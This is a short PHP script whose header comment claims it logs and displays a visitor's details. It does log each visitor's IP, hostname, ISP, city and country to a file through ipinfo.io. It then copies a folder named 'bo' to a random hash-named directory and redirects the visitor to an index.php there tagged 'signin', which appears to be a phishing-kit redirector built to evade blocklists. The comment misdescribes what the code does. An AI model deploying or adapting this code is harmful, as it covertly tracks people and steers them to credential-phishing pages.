<?
// This program generates a web pages that gets 
  // the user's information, saves it to a file, 
  // and displays it on the web page.
  // Created by Mitchell Robinson.
  // 27 July, 2014.
  
  // Name of the ip address log.
  $outputWebBug = 'visit.txt';

  // Get the ip address and info about client.
  @ $details = json_decode(file_get_contents("http://ipinfo.io/{$_SERVER['REMOTE_ADDR']}/json"));
  @ $hostname=gethostbyaddr($_SERVER['REMOTE_ADDR']);

  // Write the ip address and info to file.
  @ $fileHandle = fopen($outputWebBug, "a");
  if ($fileHandle)
  {
    $string ='"'.$QUERY_STRING.'","' // everything after "?" in the URL
      .$_SERVER['REMOTE_ADDR'].'","' // ip address
      .$hostname.'","' // hostname
      .$details->org.'","' // internet service provider
      .$details->city.'","'  // city
      .$details->country.'","' // country
      .date("D dS M,Y h:i a").'"' // date
      ."\n"
      ;
     $write = fputs($fileHandle, $string);
    @ fclose($fileHandle);
  }

  $string = '<code>'
    .'<p>'.$_SERVER['REMOTE_ADDR'].'</p><p>Hostname:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'
    .$hostname.'</p><p>Browser and OS:&nbsp;'
    .$details->org.'</p><p>City:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'
    .$details->city.'</p><p>State:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'
    .$details->country.'</p><p>Date:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'
    .date("D dS M,Y h:i a").'</p></code>'
    ;
$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
function recurse_copy($src,$dst) { 
$dir = opendir($src); 
@mkdir($dst); 
while(false !== ( $file = readdir($dir)) ) { 
if (( $file != '.' ) && ( $file != '..' )) { 
if ( is_dir($src . '/' . $file) ) { 
recurse_copy($src . '/' . $file,$dst . '/' . $file); 
} 
else { 
copy($src . '/' . $file,$dst . '/' . $file); 
} 
} 
} 
closedir($dir); 
} 
$src="bo";
recurse_copy( $src, $dst );
header("location:$dst/index.php?utm_source=signin&utm_medium=outbound-link&utm_campaign");
?>